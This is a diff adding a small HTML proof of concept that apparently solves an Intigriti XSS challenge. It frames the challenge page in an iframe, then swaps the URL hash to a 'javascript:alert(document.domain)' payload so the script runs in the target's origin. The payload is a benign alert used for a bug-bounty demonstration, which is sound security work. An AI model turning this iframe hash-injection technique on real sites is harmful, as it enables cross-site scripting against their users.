@@ -1,0 +1,10 @@
+<html>
+  <head>
+  </head>
+  <body>
+	<iframe id= "xss" src="https://challenge.intigriti.io/#https://intigriti.io"></iframe>
+  </body>
+ <script>   	
+  		setTimeout(function(e){document.getElementById('xss').src = "https://challenge.intigriti.io/#javascript:alert(document.domain)"},200);
+  </script>
+</html>
